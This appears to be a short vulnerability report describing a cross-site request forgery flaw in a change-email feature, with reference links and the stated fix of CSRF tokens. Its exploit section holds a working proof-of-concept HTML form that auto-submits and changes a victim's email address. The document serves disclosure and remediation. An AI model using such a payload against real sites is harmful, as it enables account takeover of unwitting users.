### Description

Cross-site request forgery (also known as CSRF) is a web security vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. It allows an attacker to partly circumvent the same origin policy, which is designed to prevent different websites from interfering with each other. 

refers : 
 	- https://portswigger.net/web-security/csrf
 	- https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)

### Issue

Change email feature is vulnerable to csrf attack 

### Expolit 


```html

<form action="/" method="post">
<input type="hidden" value="pwned@example.org" name="email">
</form>
<script>
      document.forms[0].submit();
</script>

```

### Fix 

implemented csrf_token based submitting in change email feature